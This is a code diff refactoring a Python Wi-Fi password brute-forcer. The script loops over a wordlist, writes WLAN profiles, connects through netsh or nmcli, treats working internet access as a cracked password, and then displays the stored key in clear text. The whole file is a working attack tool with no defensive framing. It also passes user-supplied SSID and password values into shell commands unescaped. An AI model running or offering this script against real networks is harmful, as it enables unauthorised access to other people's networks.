@@ -2,18 +2,18 @@ import os
 import platform
 import time
 import requests
-import unicodedata
 
+# URL kiểm tra kết nối Internet
+URL = "https://youtube.com"
+TIMEOUT = 5
 
-url = "https://www.python.org"
-timeout = 5
-def createNewConnection(name, SSID, key):
-    config = """<?xml version=\"1.0\"?>
+def create_new_connection(name, SSID, key):
+    config = f"""<?xml version="1.0"?>
 <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
-    <name>"""+name+"""</name>
+    <name>{name}</name>
     <SSIDConfig>
         <SSID>
-            <name>"""+SSID+"""</name>
+            <name>{SSID}</name>
         </SSID>
     </SSIDConfig>
     <connectionType>ESS</connectionType>
@@ -28,77 +28,81 @@ def createNewConnection(name, SSID, key):
             <sharedKey>
                 <keyType>passPhrase</keyType>
                 <protected>false</protected>
-                <keyMaterial>"""+key+"""</keyMaterial>
+                <keyMaterial>{key}</keyMaterial>
             </sharedKey>
         </security>
     </MSM>
 </WLANProfile>"""
-    if platform.system() == "Windows":
-        command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
-        with open(name+".xml", 'w') as file:
-            file.write(config)
-    elif platform.system() == "Linux":
-        command = "nmcli dev wifi connect '"+SSID+"' password '"+key+"'"
-    os.system(command)
-    if platform.system() == "Windows":
-        os.remove(name+".xml")
-
-def connect(name, SSID):
-    os.system("netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi")
-    time.sleep(3)
-
-def displayAvailableNetworks():
-       os.system("netsh wlan show networks interface=Wi-Fi")
-
-print("[LOADING] Searching if connected to any network")
-
-
-try:
-    request = requests.get(url, timeout=timeout)
-    print("[-] Please disconnect your internet for this operation to work, try again later"), exit()
-    
-except (requests.ConnectionError, requests.Timeout) as exception:
-    print("[LOADING] Loading program..."), time.sleep(1)
-
-connected = True
-while connected:
     try:
-        displayAvailableNetworks()
-        WIFI = input("WIFI Name: ")
-        with open('C:\\Users\\Me\\Desktop\\pass\\try.txt', 'r', encoding='utf8', errors='ignore') as f:
-            for line in f:
-                words = line.split()
-                if words:
-                    print(f"Password: {words[0]}")
-                    
-                    createNewConnection(WIFI, WIFI, words[0])
-                    connect(WIFI, WIFI)
+        if platform.system() == "Windows":
+            profile_path = f"{name}.xml"
+            with open(profile_path, "w") as file:
+                file.write(config)
+            os.system(f"netsh wlan add profile filename=\"{profile_path}\" interface=Wi-Fi")
+            os.remove(profile_path)
+        elif platform.system() == "Linux":
+            os.system(f"nmcli dev wifi connect '{SSID}' password '{key}'")
+    except Exception as e:
+        print(f"[ERROR] Failed to create connection profile: {e}")
 
-                    try:
-                        request = requests.get(url, timeout=5)
-                        connected = False
-                        choice = input(f"[+] The password might have been cracked, are you connected to {WIFI} (y/N) ? ")
-                        if choice == "y":
-                            print("\n[EXITING] Operation canceled")
-                            exit()
-                        elif choice == "n":
-                            print("\n[-] Operation continues\n")
-                        
-                    except (requests.ConnectionError, requests.Timeout) as exception:
-                        print("[LOADING] Loading program..."), time.sleep(1)
+def connect_to_network(name, SSID):
+    try:
+        os.system(f"netsh wlan connect name=\"{name}\" ssid=\"{SSID}\" interface=Wi-Fi")
+        time.sleep(3)
+    except Exception as e:
+        print(f"[ERROR] Failed to connect to network: {e}")
 
-        print("[+] Operation complete")
-        choice = input("See WIFI Information (y/N) ? ")
-        if choice == "y" or "Y":
-            print(f"[LOADING] Searching for {WIFI} network")
-            time.sleep(1)
-            os.system(f'netsh wlan show profile name="{WIFI}" key=clear')
-            exit()
-        elif choice == "n" or "N":
-            print("\n[EXITING] Exiting program...")
-            time.sleep(2)
-            exit()
+def display_available_networks():
+    try:
+        os.system("netsh wlan show networks interface=Wi-Fi")
+    except Exception as e:
+        print(f"[ERROR] Failed to display available networks: {e}")
 
-    except KeyboardInterrupt as e:
-        print("\n[[EXITING] Aborting program...")
-        exit()
+def is_connected():
+    try:
+        requests.get(URL, timeout=TIMEOUT)
+        return True
+    except (requests.ConnectionError, requests.Timeout):
+        return False
+
+def main():
+    print("[INFO] Checking Internet connection...")
+    if is_connected():
+        print("[-] Please disconnect your internet for this operation to work.")
+        return
+
+    print("[INFO] Loading program...")
+    time.sleep(1)
+    display_available_networks()
+    
+    wifi_name = input("Enter the Wi-Fi name (SSID): ")
+    password_file = input("Enter the path to the password file: ")
+
+    try:
+        with open(password_file, "r", encoding="utf-8", errors="ignore") as file:
+            for line in file:
+                password = line.strip()
+                if password:
+                    print(f"[INFO] Trying password: {password}")
+                    create_new_connection(wifi_name, wifi_name, password)
+                    connect_to_network(wifi_name, wifi_name)
+
+                    if is_connected():
+                        print(f"[SUCCESS] Connected to {wifi_name} with password: {password}")
+                        choice = input(f"[?] Do you want to display Wi-Fi details (y/N)? ")
+                        if choice.lower() == "y":
+                            os.system(f"netsh wlan show profile name=\"{wifi_name}\" key=clear")
+                        return
+                    else:
+                        print(f"[FAILED] Password '{password}' did not work.")
+        print("[INFO] Exhausted all passwords. Operation complete.")
+    except FileNotFoundError:
+        print("[ERROR] Password file not found.")
+    except Exception as e:
+        print(f"[ERROR] An error occurred: {e}")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[EXIT] Program terminated by user.")
